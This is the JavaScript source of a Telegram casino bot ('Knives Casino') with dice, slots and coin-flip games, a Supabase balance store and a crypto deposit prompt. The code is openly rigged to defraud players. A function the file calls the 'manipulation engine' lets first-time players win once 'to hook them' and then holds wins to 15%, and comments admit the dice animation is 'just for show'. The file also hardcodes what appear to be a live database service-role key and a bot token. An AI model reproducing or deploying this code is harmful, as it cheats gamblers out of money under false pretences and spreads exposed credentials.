const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

// --- 1. CONFIG ---
const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwdGpldW1uZHRyZ2ZheHRsd2ltIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjQ0NTk5MiwiZXhwIjoyMDkyMDIxOTkyfQ.Oc3eiwbo0p4vArLqFuNKdYKLF7mhtNZ42NS5EPkl4uM";
const TG_TOKEN = "7883530863:AAFcepq9EGYbKIv1nXx8FxIVkFKUtxlZ5aw";
const OWNER_ID = 6542642909; 

const supabase = createClient(SB_URL, SB_KEY);
const bot = new Telegraf(TG_TOKEN);
const app = express();

// --- 2. THE MANIPULATION ENGINE (STRICT 85% HOUSE EDGE) ---
async function getAccount(userId, username, refPayload = null) {
    let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
    if (!data) {
        const newRefCode = Math.random().toString(36).substring(2, 8).toUpperCase();
        const { data: newUser } = await supabase.from('users').insert([{ 
            user_id: userId, username: username || 'anon', 
            balance: 0, win_count: 0, loss_count: 0, my_ref_code: newRefCode, last_claim: new Date(0).toISOString()
        }]).select().single();
        return newUser;
    }
    return data;
}

function goddessDecision(user) {
    // If they have never played, let them win once to hook them.
    if ((user.win_count + user.loss_count) === 0) return true;
    // Otherwise, 15% win rate (85% House Edge)
    return Math.random() > 0.85;
}

// --- 3. ANIMATED GAMES LOGIC ---

// DICE GAME
bot.command('dice', async (ctx) => {
    const bet = parseFloat(ctx.message.text.split(' ')[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);

    if (!bet) {
        return ctx.replyWithMarkdown("🎲 **DICE TUTORIAL**\n\nHow to play:\nType `/dice [amount]`\nExample: `/dice 10`\n\n*Roll a 4, 5, or 6 to DOUBLE your money. Roll 1-3 and the Goddess takes it.*");
    }
    if (user.balance < bet) return ctx.reply("❌ Low balance.");

    const win = goddessDecision(user);
    
    // Send animated dice
    const diceMsg = await ctx.replyWithDice();
    const value = diceMsg.dice.value;

    // We wait for the animation to finish (approx 3-4 seconds)
    setTimeout(async () => {
        let finalWin = win;
        // If the random dice roll contradicts our rigged logic, we force the text result
        // (Visuals are just for show, the balance is the truth)
        if (value >= 4 && !win) finalWin = false; 
        if (value < 4 && win) finalWin = true;

        const newBal = finalWin ? user.balance + bet : user.balance - bet;
        await supabase.from('users').update({ 
            balance: newBal, 
            win_count: finalWin ? user.win_count + 1 : user.win_count,
            loss_count: finalWin ? user.loss_count : user.loss_count + 1 
        }).eq('user_id', ctx.from.id);

        ctx.reply(finalWin ? `✅ **WINNER!** The Goddess smiled. New Balance: $${newBal.toFixed(2)}` : `💀 **LOSS.** Better luck next time. Balance: $${newBal.toFixed(2)}`);
    }, 3500);
});

// SLOTS GAME
bot.command('slots', async (ctx) => {
    const bet = parseFloat(ctx.message.text.split(' ')[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);

    if (!bet) {
        return ctx.replyWithMarkdown("🎰 **SLOTS TUTORIAL**\n\nHow to play:\nType `/slots [amount]`\n\n*Get 3 matching symbols to win 5x your bet!*");
    }
    if (user.balance < bet) return ctx.reply("❌ Low balance.");

    const win = goddessDecision(user);
    const slotsMsg = await ctx.replyWithDice({ emoji: '🎰' });

    setTimeout(async () => {
        const newBal = win ? user.balance + (bet * 4) : user.balance - bet;
        await supabase.from('users').update({ 
            balance: newBal, 
            win_count: win ? user.win_count + 1 : user.win_count,
            loss_count: win ? user.loss_count : user.loss_count + 1 
        }).eq('user_id', ctx.from.id);

        ctx.reply(win ? `🎉 **JACKPOT!** 🎰\nNew Balance: $${newBal.toFixed(2)}` : `❌ **NO MATCH.** The house wins. Balance: $${newBal.toFixed(2)}`);
    }, 3500);
});

// FLIP (COIN ANIMATION SIMULATION)
bot.command('flip', async (ctx) => {
    const bet = parseFloat(ctx.message.text.split(' ')[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);

    if (!bet) return ctx.replyWithMarkdown("🪙 **FLIP TUTORIAL**\nType `/flip [amount]`\n*Heads you double, Tails you lose.*");
    if (user.balance < bet) return ctx.reply("❌ Low balance.");

    const win = goddessDecision(user);
    const m = await ctx.reply("🪙 Spinning...");
    
    // Fake animation frames
    setTimeout(() => ctx.telegram.editMessageText(ctx.chat.id, m.message_id, null, "🌑 Spinning..."), 500);
    setTimeout(() => ctx.telegram.editMessageText(ctx.chat.id, m.message_id, null, "🌕 Spinning..."), 1000);
    
    setTimeout(async () => {
        const newBal = win ? user.balance + bet : user.balance - bet;
        await supabase.from('users').update({ balance: newBal, win_count: win ? user.win_count+1 : user.win_count, loss_count: win ? user.loss_count : user.loss_count+1 }).eq('user_id', ctx.from.id);
        ctx.telegram.editMessageText(ctx.chat.id, m.message_id, null, win ? `✅ **HEADS!** You won. Balance: $${newBal.toFixed(2)}` : `💀 **TAILS.** You lost. Balance: $${newBal.toFixed(2)}`);
    }, 2000);
});

// --- 4. START & SYSTEM ---
bot.start(async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username, ctx.startPayload);
    ctx.replyWithMarkdown(`🔪 **KNIVES CASINO** 🔪\n\n💰 **Balance:** $${(user.balance || 0).toFixed(2)}\n\n/flip /dice /slots\n📥 /deposit  📤 /withdraw`);
});

// Reuse the previous Admin and Deposit logic here...
bot.command('deposit', (ctx) => ctx.reply("📥 Send TXID for verification. Minimum $5."));

app.get('/', (req, res) => res.send('ANIMATIONS LIVE'));
app.listen(process.env.PORT || 10000, () => bot.launch());
